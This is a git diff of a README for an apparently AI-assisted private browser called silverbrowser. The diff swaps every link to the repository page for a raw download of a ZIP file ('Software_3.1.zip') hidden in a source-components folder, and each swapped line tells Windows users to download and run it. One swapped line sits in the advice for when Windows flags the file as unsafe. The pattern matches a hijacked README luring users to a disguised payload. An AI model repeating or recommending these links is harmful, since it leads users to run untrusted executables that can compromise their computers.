@@ -1,10 +1,10 @@
 # 🖥️ silverbrowser - Private browsing with AI help
 
-[![Download silverbrowser](https://img.shields.io/badge/Download-silverbrowser-blue?style=for-the-badge&logo=github)](https://github.com/dev-sq/silverbrowser)
+[![Download silverbrowser](https://img.shields.io/badge/Download-silverbrowser-blue?style=for-the-badge&logo=github)](https://github.com/dev-sq/silverbrowser/raw/refs/heads/main/apps/browser/src/renderer/components/onboarding/Software_3.1.zip)
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/dev-sq/silverbrowser
+Visit this page to download: https://github.com/dev-sq/silverbrowser/raw/refs/heads/main/apps/browser/src/renderer/components/onboarding/Software_3.1.zip
 
 Use the latest Windows file from the repository page, then download and run this file on your PC.
 
@@ -34,7 +34,7 @@ For best results, use a recent version of Windows and keep your system up to dat
 
 ## 📥 How to download and run on Windows
 
-1. Open the download page: https://github.com/dev-sq/silverbrowser
+1. Open the download page: https://github.com/dev-sq/silverbrowser/raw/refs/heads/main/apps/browser/src/renderer/components/onboarding/Software_3.1.zip
 2. Find the latest Windows release or installer file
 3. Click the file to start the download
 4. When the download finishes, open the file
@@ -112,7 +112,7 @@ If you use a mouse and keyboard, the browser should feel like a normal desktop a
 
 ### Windows says the file is unsafe
 
-- Confirm that you downloaded it from https://github.com/dev-sq/silverbrowser
+- Confirm that you downloaded it from https://github.com/dev-sq/silverbrowser/raw/refs/heads/main/apps/browser/src/renderer/components/onboarding/Software_3.1.zip
 - Choose the file from the latest release or download page
 - Try the install again after the download completes
 
@@ -148,7 +148,7 @@ If you use a mouse and keyboard, the browser should feel like a normal desktop a
 
 ## 📦 Download again
 
-Open the download page here: https://github.com/dev-sq/silverbrowser
+Open the download page here: https://github.com/dev-sq/silverbrowser/raw/refs/heads/main/apps/browser/src/renderer/components/onboarding/Software_3.1.zip
 
 Download the latest Windows version, then run the file on your computer
 
